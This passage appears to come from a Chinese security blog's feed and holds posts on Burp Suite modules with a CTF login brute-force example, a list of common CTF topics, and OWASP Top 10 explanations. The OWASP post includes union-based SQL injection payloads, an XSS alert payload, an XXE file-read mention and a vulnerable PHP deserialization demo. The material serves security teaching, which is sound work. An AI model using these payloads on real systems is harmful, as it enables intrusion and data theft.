data-original="https://img-blog.csdnimg.cn/20200610114544809.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br><br>其中箭头所指的选项卡功能如下<br>功能     | 含义<br>——– | —–<br>Forward  |放行数据包，将拦截的数据包或修改后的数据包发送至服务器<br>Drop | 丢弃当前拦截的数据包<br>Interception on/off  | on表示开启拦截   off表示关闭拦截<br>Action  | 将数据包进一步发送到Spider、Scanner、Repeater、Intruder等功能做进一步测试，同时也包含改变数据包请求方式以及其body的编码等功能</p><br>而当我们抓到一个包之后，会有三个小页面的内容<br><br><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200610115448657.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200610115455730.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200610115506717.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>其对应的名称和含义分别为：</p><table><thead><tr><th>名称</th><th>含义</th></tr></thead><tbody><tr><td>raw</td><td>主要显示web请求的raw格式，以存文本的形式显示数据包，包含请求地址、HTTP协议版本、主机头、浏览器信息、Accept可接受的内容类型、字符集、编码方式、cookie等。可以通过手动修改这些信息，对服务端进行渗透测试</td></tr><tr><td>hex</td><td>对应的是raw信息的二进制内容，可以通过Hex编辑器对请求的内容进行修改，在进行00截断的时候非常好用</td></tr><tr><td>headers</td><td>显示数据包中的头信息、以名称、值的形式显示数据包</td></tr></tbody></table><h2 id="2、Intruder模块"><a href="#2、Intruder模块" class="headerlink" title="2、Intruder模块"></a>2、Intruder模块</h2><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/2020061011563426.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>intruder是一个定制的高度可配置的工具，其工作原理是<strong>Intruder在原始请求数据的基础上，通过修改各种请求参数获取不同的请求应答</strong>。</p><p>在每一次的请求中，intruder通常会携带一个或多个有效攻击载荷，在不同的位置进行攻击重放，通过应答数据的分析对比来获取所需的特征数据</p><p>简单来说，就是在原始请求数据的基础上,通过修改不同的请求参数来获取不同的请求应答。最常见的使用就是用于<font color='red'>暴力破解 </font>。<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200610114617898.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>而其中的爆破模式，有所区别，我用表格的形式分享给大家<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200610115752577.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br><br>爆破模式    |  用途<br>——– | —–<br>Sniper  |使用单一的payload组，适用于对常见漏洞中的请求参数单独进行的fuzzing测试的情景<br>Battering ram | 使用单一的payload组，适用于需要在请求中把相同的输入放到多个位置的情景<br>Pitchfork  |使用多个payload组，适用于在不同位置需要输入不同但相似输入的情况<br>Cluster bomb| 使用多个payload组，适用于在位置中需要不同且不相关或者未知输入攻击的情景</p><p>看到这里可能还有许多朋友，还是有许多朋友并不了解具体该怎么应用，这里我也分享一下我对不同爆破模式应用场景的理解<br><font color='blue'><br>sniper: 适用于一个位置 单个参数<br><br>battering  ram:适用于多个位置 相同参数<br><br>pitchfork:适用于多个位置 相似参数<br><br>cluster bomb:适用于多个位置  不同参数<br></font></p><br><h2 id="3、Repeater模块"><a href="#3、Repeater模块" class="headerlink" title="3、Repeater模块"></a>3、Repeater模块</h2><p><strong>Burp Repeater是一个手动修改、补发个别HTTP请求，并分析它们的响应的工具</strong>。它最大的用途就是能和其他Burp Suite工具结合起来使用。可以将目标站点地图、Burp Proxy浏览记录、Burp Intruder的攻击结果，发送到Repeater上，手动调整这个请求进行测试。</p><p>对我来说，我常常使用了代理模块拦截了网页的http请求包之后，我就会点击使用Proxy模块下的Action选项，进一步发送到Repeater进行后续操作。<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200610120007463.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br><br>其后续操作包括但不限于<strong>观察页面返回信息、尝试00截断</strong>等<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200610120015505.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br></p><h2 id="4、Scanner模块"><a href="#4、Scanner模块" class="headerlink" title="4、Scanner模块"></a>4、Scanner模块</h2><p>Burp Scanner主要用于<strong>自动检测Web系统中的各种漏洞</strong><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200610114705190.jpg#pic_center" alt=""><br>该模块的扫描方式可以分为两种：</p><p><strong>主动扫描：</strong><br>使用主动扫描模式时，Burp会向应用发送新的请求并通过payload验证漏洞。<br>这种模式下的操作会产生大量请求和应答数据，直接影响服务端的性能，通常用于非生产环境。</p><p>适用于客户端漏洞 如XSS、HTTP头注入、操作重定向<br>服务度漏洞  SQL注入、命令行注入、文件遍历</p><p><strong>被动扫描：</strong><br>采用被动扫描时，Burp不会发送新的请求，只是对已经存在的请求和应答进行分析，对服务端的检测来说，这比较安全<br><br></p><h2 id="4、Spider模块"><a href="#4、Spider模块" class="headerlink" title="4、Spider模块"></a>4、Spider模块</h2><p>Spider的蜘蛛爬行功能可以帮助我们<strong>了解系统的结构</strong>，其中Spider爬取到的内容将在Target中展示<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200610120208336.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><h2 id="5、Decoder模块"><a href="#5、Decoder模块" class="headerlink" title="5、Decoder模块"></a>5、Decoder模块</h2><p>它是Burp中自带的<strong>编码解码以及散列转换</strong>的工具，能对原始数据进行各种编码格式和散列的转换<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200610120217220.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br></p><h1 id="03-BurpSuite的用途"><a href="#03-BurpSuite的用途" class="headerlink" title="03 BurpSuite的用途"></a>03 BurpSuite的用途</h1><p>综上所述，BurpSuite可以用于：</p><p>1、<font color='blue'>做个中间商，做坏事， </font>即对浏览器与网站服务器两者之间的数据包进行拦截、查看、修改<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/2020061011471696.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>2、<font color='blue'>做个一根筋的人，狂刷字典，</font>即对网页上存在的登录框进行爆破破解<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200610114725262.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>3、<font color='blue'>做个百事通，手拿编码解码百科全书，</font>即进行各种解码编码转换<br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/2020061011473315.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>4、<font color='blue'>做个侦探，拿着放大镜，</font>即尽可能找到一个网站存在的漏洞</p><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/2020061011473870.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br></p><h1 id="04-我们对BurpSuite的利用"><a href="#04-我们对BurpSuite的利用" class="headerlink" title="04 我们对BurpSuite的利用"></a>04 我们对BurpSuite的利用</h1><p>简单总结一下<br>当我们想要<font color='red'>对一个网站抓包、某个网页的登录框暴力破解、修改请求信息观察页面回显代码 </font>、等等等等，BurpSuite都将是我们的不二之选！！！</p><p><strong>这里，以一道攻防世界CTF题举栗子：</strong></p><p>实现通过BurpSuite对某个登录界面进行暴力破解：<br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200610120850762.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>1.用BurpSuite拦截登录的数据包,把数据包发送到intruder爆破<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200610120902695.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>2.设置爆破点为password，并且因为是单个位置爆破，所以选择sniper爆破模式<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/2020061012091555.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>3.加载字典<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200610120927763.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>4.开始攻击，查看响应包列表，发现密码为123456时，响应包的长度和别的不一样<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200610120933875.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>5.点进去查看响应包，获得flag<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200610120942592.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p><br><br><br><br>本文完，感谢你的阅读！！！</p><p>最后，如果本文对你有所帮助，<strong>希望可以点个赞支持一下</strong>。你们的鼓励将会是博主原创的动力。<br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200616063600946.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BurpSuite </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF——常见题型</title>
      <link href="/2020/07/20/ctf-chang-jian-ti-xing/"/>
      <url>/2020/07/20/ctf-chang-jian-ti-xing/</url>
      
        <content type="html"><![CDATA[<p>最近面试的时候，有面试官考察了一些常见的CTF题型。<br>于是索性，我将一些常见的CTF知识点整理如下：</p><p>@<a href="为方便您的阅读，可戳下方蓝字，快速跳转！！！">TOC</a></p><h2 id="01-WEB"><a href="#01-WEB" class="headerlink" title="01 WEB"></a>01 WEB</h2><p><strong>命令注入</strong>：web页面输入款中注入Shell命令<br><br><br><strong>SQL注入</strong>：Web页面输入框中注入SQL命令<br><br><br><strong>文件上传</strong>：绕过文件上传限制上传webshell至服务器<br><br><br><strong>文件包含</strong>：网站开放了特定函数，可浏览网站本地文件，最好配合webshell使用<br><br><br><strong>XSS</strong>:注入脚本命令，弹窗关键信息，获取cookie<br><br><br><strong>代码审计</strong>：检索源代码，寻找源代码中的漏洞<br><br><br><strong>Restful API</strong>：打开Web世界通信的栈道<br><br><br><strong>Owsap 10</strong>：10项最严重的的Web应用程序安全风险<br><br><br><strong>BurpSuite</strong>：抓包改包神器，拦截、查看、修改Http/Https请求包<br><br><br></p><h2 id="02-Crypto（密码学）"><a href="#02-Crypto（密码学）" class="headerlink" title="02 Crypto（密码学）"></a>02 Crypto（密码学）</h2><p><strong>凯撒密码</strong>：英文字母表，不停的移位操作<br><br><br><strong>摩斯密码</strong>：一句话：滴答滴答（-..） 对照密码本翻译<br><br><br><strong>栅栏密码</strong>：固定一个行数，从上到下排列，在从左到右读<br><br><br><strong>培根密码</strong>：每个字母转换位一组5个英文字母<br><br><br><strong>云影密码</strong>：密文由01248数字构成<br><br><br><strong>键盘密码</strong>：与键盘一一对应<br><br><br><strong>Base64编码</strong>：64 = 26个小写字母 + 26个大写字母 +10 个数字 + 2 个特殊字符 + 1个尾巴，区分大小写、尾部可能有=、==<br><br><br><strong>ASCII编码</strong>：全部都为数字或二进制，如56,45,53,63,45,33 、 0001010010100101010<br><br><br><strong>URL编码</strong>：带有特殊符号%，如%9%h%d%s<br><br><br><strong>unicode编码</strong>：带有许多/uxxx，如/uxxfdsafasd/uxxjfskdjfk<br><br><br><strong>JS混淆</strong>:有eval和function存在,如eval(fdsajkfj)<br><br><br><strong>aaencode编码</strong>：有表情符号，如(づ￣3￣)づ╭❤～</p><p><br><br></p><h2 id="03-MISC（安全杂项）"><a href="#03-MISC（安全杂项）" class="headerlink" title="03 MISC（安全杂项）"></a>03 MISC（安全杂项）</h2><p><strong>图片隐写</strong>：信息隐藏在jpg文件中，可利用kali下exiftool工具，如exiftool  flag.jpg<br><br><br><strong>GIF图片隐写</strong>：信息藏在gif文件中，可使用stegsollve 工具提取<br><br><br><strong>PDF文件</strong>：信息隐藏在PDF文件中，可使用kali工具pdftotext，如pdftotext flag.pdf  flag.txt<br><br><br><strong>流量隐写</strong>：从pcap文件中提取隐藏信息</p><p>1、通过binwrok查看pack包里隐藏的文件</p><p>2、通过formost分离出隐藏文件</p><p>3、通过wireshark分析流量中的信息  过滤字符串  图片二进制的起点是 FFD8 终点是FFD9  </p><p>4、通过hex对二进制文件进行保存 成为图片</p><br><p><strong>残破的二维码复原/图片复原</strong>：残缺混乱的图片重新排列组合，可能缺定位符，用图片修改软件补上就好</p><p><br><br></p><h2 id="04-PWN（溢出类）"><a href="#04-PWN（溢出类）" class="headerlink" title="04 PWN（溢出类）"></a>04 PWN（溢出类）</h2><p><strong>缓冲区溢出</strong>：控制函数返回地址，可利用上python的pantool库</p><br><p><strong>返回到Libc</strong>：其实也是缓冲区溢出，只不过溢出的同时，伪造了另一个函数栈，他需要安排另一个函数的入参和返回地址，这里一般溢出的时候进入system函数，然后安排一个binshell字符串，控制函数返回地址。<br><br><br><br><strong>栈值覆盖</strong>：栈值覆盖也是缓冲区溢出，只不过它控制的不是函数的返回地址，而是栈上的一个地址，一般是if的一个判断值，将这个false改为true，从而改变函数的执行流程</p><br><p><strong>整数溢出</strong>：int8的范围是0-255，那么256就是0。如果发生在if的判断里，通过整数溢出就可以进入一个新的分支，如果新的分支再有一个缓冲区溢出漏洞，就可以改变函数的执行流。<br><br><br><br><strong>格式化字符串</strong>：%n任意地址写值，一个int*指针</p><p><br><br></p><h2 id="05-REVERSE（逆向工程）"><a href="#05-REVERSE（逆向工程）" class="headerlink" title="05 REVERSE（逆向工程）"></a>05 REVERSE（逆向工程）</h2><p><strong>PEtools查壳</strong>：逆向题，先查壳在说<br><br><br><strong>Upx脱壳</strong>：脱了壳才算开始<br><br></p><p><strong>IDA pro静态反汇编</strong>：静态分析神器<br><br><br><strong>OllyDbg动态调试</strong>:动态分析神器，通过各种断点调试进入到调试，改变函数流程等。<br><br><br><strong>逆向签到题</strong>：通过对二进制文件扫描一下，linux下通过 strings demo | grep flag  windows通过hex</p><p><br><br><br></p><p><strong>以上文章，作为自己的学习笔记，仅供参考</strong></p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OWASP Top 10十大风险——解析及实例</title>
      <link href="/2020/07/20/owasp-top-10-shi-da-feng-xian-jie-xi-ji-shi-li/"/>
      <url>/2020/07/20/owasp-top-10-shi-da-feng-xian-jie-xi-ji-shi-li/</url>
      
        <content type="html"><![CDATA[<p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/2020060408444866.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>@<a href="为方便您的阅读，可戳下方蓝字，快速跳转！！！">TOC</a><br>#</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id="-1"><a href="#-1" class="headerlink" title=""></a></h3><h1 id="A1-2017-注入"><a href="#A1-2017-注入" class="headerlink" title="A1: 2017-注入"></a>A1: 2017-注入</h1><p>将不受信任的数据作为命令或查询的一部分发送到解析器时，会产生诸如<strong>SQL注入、NoSQL注入、OS注入和LDAP注入的注入缺陷</strong>。攻击者的恶意数据可以诱使解析器在<strong>没有适当授权的情况下执行非预期命令或访问数据。</strong></p><p>在这里我分享一下<strong>SQL注入有回显情况下最基础的Union注入语句</strong>：</p><p>①查询该数据表的<strong>字段数</strong><br>order  by 1-99   </p><p>②查看<strong>回显结果</strong><br>id =-1 union select 1,2,3</p><p>③查看<strong>数据库</strong><br>id  =-1 union select 1,database（）,3</p><p>④查看<strong>数据表</strong><br>在上述database（）的位置替换为<br>（select table_name from  information_schema.tables where  table_schema = ‘sql ‘  limit  0,1）</p><p>⑤查看<strong>数据列</strong><br>（select  column_name  from  information_schema.columns where  table_schema =’sql’ and  table_name = ‘emial’ limit 0,1）</p><p>⑥查看<strong>对应数据</strong><br>（select emial_id from  sql.emial limit  0,1）</p><p>举个在线靶场的<strong>SQL注入栗子</strong>：</p><p><strong>注入语句</strong><br>1 and 1=2 UNION SELECT 1,database(),column_name,4 from information_schema.columns where table_schema=’mozhe_Discuz_StormGroup’ and table_name=’StormGroup_member’ limit 0,1</p><p><strong>页面回显</strong><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200604082325986.png#pic_center" alt=""></p><p><br><br></p><h1 id="A2-2017-失效的身份认证"><a href="#A2-2017-失效的身份认证" class="headerlink" title="A2: 2017-失效的身份认证"></a>A2: 2017-失效的身份认证</h1><p>通常，通过错误使用应用程序的<strong>身份认证</strong>和<strong>会话管理</strong>功能，攻击者能够破译密码、密钥或会话令牌，或者利用其它开发缺陷来<strong>暂时性或永久性冒充其他用户的身份</strong>。</p><p>在黑客笔记靶场中，我们只需要拿到对手的Cookie，我们可以不通过用户名和密码，直接在请求中带上对手的Cookie，直接伪造对手提交请求，所以保护好自己Cookie很重要。<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200604082345432.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p><br><br></p><h1 id="A3-2017-敏感数据泄露"><a href="#A3-2017-敏感数据泄露" class="headerlink" title="A3: 2017-敏感数据泄露"></a>A3: 2017-敏感数据泄露</h1><p>许多Web应用程序和API都无法正确保护敏感数据，例如：财务数据、医疗数据和PII数据。攻击者可以通过窃取或<strong>修改未加密的数据</strong>来实施信用卡诈骗、身份盗窃或其他犯罪行为。未加密的敏感数据容易受到破坏，因此，我们需要对敏感数据加密，这些数据包括：<strong>传输过程中的数据、存储的数据以及浏览器的交互数据。</strong></p><p>在以前会发现很多网站的账户登录页面，账户名和密码是直接明文传输的，我们一抓包就能看见。而现在这种情况少了很多，尤其是大厂基本上都不会是明文传输</p><p>这里以<strong>QQ登录页面</strong>为例，试试看能不能抓包到<strong>用户名和密码</strong>？</p><p>这里我用户名输入：<a href="mailto:test@qq.com" rel="external nofollow noreferrer">test@qq.com</a>  密码输入：123456<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/2020060408235669.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><strong>仔细观察，并未发现有关于用户名和密码的关键信息</strong><br><br><br></p><h1 id="A4-2017-XML-外部实体（XXE）"><a href="#A4-2017-XML-外部实体（XXE）" class="headerlink" title="A4: 2017-XML 外部实体（XXE）"></a>A4: 2017-XML 外部实体（XXE）</h1><p>许多较早的或配置错误的XML处理器评估了XML文件中的外部实体引用。攻击者可以利用外部实体窃取使用URI文件处理器的内部文件和共享文件、<strong>监听内部扫描端口</strong>、<strong>执行远程代码</strong>和实施<strong>拒绝服务攻击</strong>。</p><pre class=" language-powershell"><code class="language-powershell"><span class="token namespace">[root@host myzoo]</span><span class="token comment" spellcheck="true"># cat ailx10.xml </span>&lt;?xml version=<span class="token string">"1.0"</span> encoding=<span class="token string">"UTF-8"</span>?>&lt;<span class="token operator">!</span>DOCTYPE root<span class="token punctuation">[</span>&lt;<span class="token operator">!</span>ENTITY name <span class="token string">"ailx10"</span>><span class="token punctuation">]</span>>&lt;root>&amp;name<span class="token punctuation">;</span>&lt;<span class="token operator">/</span>root></code></pre><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200604082539952.png#pic_center" alt="该截图来自于知乎答主alix10"><br>通过SYSTEM “file:///etc/passwd”获取隐私信息。<br>libxml2.9.0以后，默认不解析外部实体。也就是说XML外部实体攻击成了个保护动物，很难再见到了</p><p><br><br></p><h1 id="A5-2017-失效的访问控制"><a href="#A5-2017-失效的访问控制" class="headerlink" title="A5: 2017-失效的访问控制"></a>A5: 2017-失效的访问控制</h1><p>未对通过身份验证的用户实施恰当的访问控制。攻击者可以利用这些缺陷访问未经授权的功能或数据，例如：<strong>访问其他用户的帐户、查看敏感文件、修改其他用户的数据、更改访问权限</strong>等。</p><p>在攻防世界靶场中，假如一个网页不添加任何访问限制，只是隐藏的话，那么只要在浏览器地址栏中输入该页面的地址，就能对其进行访问，如<strong>直接访问PHP页面</strong><br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200604082555509.png#pic_center" alt=""><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200604082601782.png#pic_center" alt=""></p><h1 id="A6-2017-安全配置错误"><a href="#A6-2017-安全配置错误" class="headerlink" title="A6: 2017-安全配置错误"></a>A6: 2017-安全配置错误</h1><p>安全配置错误是<strong>最常见的安全问题</strong>，这通常是由于<strong>不安全的默认配置</strong>、<strong>不完整的临时配置</strong>、<strong>开源云存储</strong>、<strong>错误的HTTP 标头配置</strong>以及<strong>包含敏感信息的详细错误信息</strong>所造成的。因此，我们不仅需要对所有的操作系统、框架、库和应用程序进行安全配置，而且必须及时修补和升级它们。</p><p>比如说之前<strong>某大型连锁酒店数据库被脱库事件</strong>。这个事件的原因就是安全配置错误，据说是该酒店公司员工一时疏忽将管理员密码上传到了github上。<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200604082618399.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br><br></p><h1 id="A7-2017-跨站脚本（XSS）"><a href="#A7-2017-跨站脚本（XSS）" class="headerlink" title="A7: 2017-跨站脚本（XSS）"></a>A7: 2017-跨站脚本（XSS）</h1><p>当应用程序的新网页中包含不受信任的、未经恰当验证或转义的数据时，或者使用可以创建HTML或JavaScript 的浏览器API 更新现有的网页时，就会出现XSS 缺陷。XSS 让攻击者能够在受害者的浏览器中执行脚本，并劫持用户会话、破坏网站或将用户重定向到恶意站点。</p><p>比如我们输入，</p><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span></code></pre><p>则页面弹窗<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200604082631282.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>其实XSS漏洞除了可以用来显示弹窗之外，还可以<strong>盗取Cookie</strong>、<strong>会话劫持</strong>，甚至还可以专门写一个<strong>XSS蠕虫</strong></p><p><br><br></p><h1 id="A8-2017-不安全的反序列化"><a href="#A8-2017-不安全的反序列化" class="headerlink" title="A8: 2017-不安全的反序列化"></a>A8: 2017-不安全的反序列化</h1><p>不安全的反序列化会导致远程代码执行。即使反序列化缺陷不会导致远程代码执行，攻击者也可以利用它们来执行攻击，包括：<strong>重播攻击</strong>、<strong>注入攻击</strong>和<strong>特权升级攻击</strong>。</p><pre class=" language-powershell"><code class="language-powershell"><span class="token namespace">[root@host myzoo]</span><span class="token comment" spellcheck="true"># cat ailx10.php </span>&lt;?php <span class="token comment" spellcheck="true">#黑客笔记靶场 反序列化 临时演示文件</span><span class="token keyword">class</span> AI<span class="token punctuation">{</span>    <span class="token keyword">var</span> <span class="token variable">$hack</span>=<span class="token string">'hey hack'</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> __destruct<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">echo</span> <span class="token variable">$this</span><span class="token operator">-</span>>hack<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$ailx10</span> = <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'hack'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$ailx11</span> = unserialize<span class="token punctuation">(</span><span class="token variable">$ailx10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?></code></pre><p><br><br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200604082715715.png#pic_center" alt="该截图来自于知乎答主alix10"><br>可以看到反序列化输出了浏览器中我们自主可控的字符串：ailx10studying 。<br><br><br></p><h1 id="A9-2017-使用含有已知漏洞的组件"><a href="#A9-2017-使用含有已知漏洞的组件" class="headerlink" title="A9: 2017-使用含有已知漏洞的组件"></a>A9: 2017-使用含有已知漏洞的组件</h1><p>一些含有漏洞的组 件组件（例如：库、框架和其他软件模块）拥有和应用程序相同的权限。如果应用程序中含有已知漏洞的组件被攻击者利用，可能会造成严重的数据丢失或服务器接管。同时，使用含有已知漏洞的组件的应用程序和API可能会破坏应用程序防御、造成各种攻击并产生严重影响。</p><p>对于我们来说，也就是适时打补丁。比如之前<strong>勒索病毒爆发后</strong>，各安全平台后续推出防勒索病毒的<strong>补丁</strong>，打上就好<br><br><img src="/medias/comment_bg.png" 